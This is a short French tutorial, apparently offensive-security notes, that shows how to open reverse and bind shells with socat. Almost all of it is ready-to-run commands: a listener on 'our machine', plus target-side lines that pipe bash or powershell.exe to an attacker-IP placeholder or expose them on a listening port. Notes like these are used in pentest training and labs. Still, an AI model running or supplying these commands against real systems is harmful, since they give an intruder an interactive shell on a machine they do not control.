
## __Reverse shell__

Pour setup un reverse shell avec socat c'est légèrement plus compliqué qu'avec netcat.

#### 1- Listener -- Notre machine

Sur notre machine il faut effectuer la commande :

```shell
user@ip: ~$ socat TCP-L:1345 -
```

Cette commande est équivalente à faire **`nc -vnlp 1234`**.

#### 2- Connection -- Machine cible

Sur la machine cible, on va effectuer la commande :

1) Sur une machine **windows**

```shell
PS C:\Users\user> socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

2) Sur une machine **linux**

```shell
user@raspberrypi: ~$ socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:"bash -li"
```


## __Bind shell__

#### 1- Listener -- Machine cible

1) Sur la machine cible sous linux :

```shell
user@raspberrypi: ~$ socat TCP-L:<TARGET-PORT> EXEC:"bash -li"
```

2) Sur une machine Windows

```shell
PS C:\Users\user> socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

#### 2- Connection -- Notre machine

```shell
user@ip: ~$ socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

